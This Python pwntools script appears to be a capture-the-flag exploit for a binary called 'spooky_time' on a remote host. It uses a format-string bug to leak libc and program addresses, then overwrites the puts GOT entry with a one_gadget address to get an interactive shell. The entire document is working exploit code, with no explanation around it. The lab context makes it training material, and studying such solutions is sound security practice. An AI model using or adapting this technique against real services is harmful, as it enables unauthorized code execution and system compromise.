#!/usr/bin/env python3

from pwn import *

exe = ELF("./spooky_time_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.59.119',38460)
#gdb.attach(p,gdbscript='''
#           b*main+175
#           b*main+210

#           ''')

payload_leak = b'%49$p|%51$p'
p.sendline(payload_leak)

p.recvuntil(b'Seriously?? I bet you can do better than')
p.recvline()

leak_libc = int(p.recvuntil(b'|')[:-1],16)
exe_address  = int(p.recvline()[:-1],16)
exe.address = exe_address - exe.sym.main
libc.address = leak_libc - libc.sym.__libc_start_call_main + 128 - 0x100
log.info(f"exe: {hex(exe.address)}")
log.info(f"libc base: {hex(libc.address)}")
one_gadget = libc.address + 0xebcf5

got_puts = exe.got.puts
got_puts_2 = got_puts + 1

system_1 = one_gadget & 0xff
system_2 = one_gadget >> 8 & 0xffff

log.info(f"system {hex(libc.sym.system)}")
log.info(f"one gadget: {hex(one_gadget)}")


payload_overwrite_got = f"%{system_1}c%16$hn".encode()
payload_overwrite_got += f"%{system_2-system_1}c%17$hn".encode()
payload_overwrite_got = payload_overwrite_got.ljust(0x40,b'p')
payload_overwrite_got += p64(got_puts)
payload_overwrite_got += p64(got_puts_2)


offset = 8
payload = fmtstr_payload(offset, {exe.got['puts'] : one_gadget})

input("payload2")
p.sendline(payload_overwrite_got)

p.interactive()
